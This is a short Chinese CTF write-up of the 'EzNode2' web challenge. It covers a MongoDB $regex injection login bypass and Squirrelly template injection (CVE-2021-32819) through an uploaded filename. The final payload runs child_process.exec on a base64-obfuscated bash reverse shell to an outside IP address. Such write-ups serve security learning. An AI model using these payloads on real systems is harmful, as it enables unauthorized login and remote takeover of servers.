# 2022.11

# Web

## ****EzNode2****

提供了源码，源码中有提到是mangodb,而前端给出admin的提示

![Untitled](2022%2011%20a372398f4a1b483c9176b77bc2c7fd4e/Untitled.png)

waf

```jsx
function filter(str) {
    return /gt|lt|lte|gte|eq|ne|where/.test(str)
}
```

waf中为过滤$regex

重言式绕过

{"username":{"$regex":"^admin"},"password":{"$regex":".*"}}

![Untitled](2022%2011%20a372398f4a1b483c9176b77bc2c7fd4e/Untitled%201.png)

![Untitled](2022%2011%20a372398f4a1b483c9176b77bc2c7fd4e/Untitled%202.png)

成功登录admin后，是上传页面

![Untitled](2022%2011%20a372398f4a1b483c9176b77bc2c7fd4e/Untitled%203.png)

上传后的文件会被渲染

![Untitled](2022%2011%20a372398f4a1b483c9176b77bc2c7fd4e/Untitled%204.png)

使用的引擎是squirrelly

[Nodejs Squirrelly 模板引擎 RCE(CVE-2021-32819)漏洞分析](https://www.aisoutu.com/a/543359)

摘要：

![Untitled](2022%2011%20a372398f4a1b483c9176b77bc2c7fd4e/Untitled%205.png)

在dataoutput这里拼接的时候可以进行变量的控制,name是最好控制的

`data.output = '{"id":"3", "filename":"' + [req.files.file.name](http://req.files.file.name/) + '", "filesize":"' + req.files.file.size + '", "mimetype":"' + req.files.file.mimetype + '", "filehash":"' + req.files.file.md5 + '"}'`

就像文章中类似的payload。利用回调函数实现命令执行

有提到env.

```jsx
{
  varName: "it",
  autoTrim: [false, "nl"],
  autoEscape: true,
  defaultFilter: false,
  ...,
  variable: "HelloWorld",
  _locals: { },
  ...
}
```

payload

filename\",\"defaultFilter\":\"e');let require = global.require || global.process.mainModule.constructor._load; require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjA2LjM3LzIzNDU2ICAwPiYx|base64 -d|bash');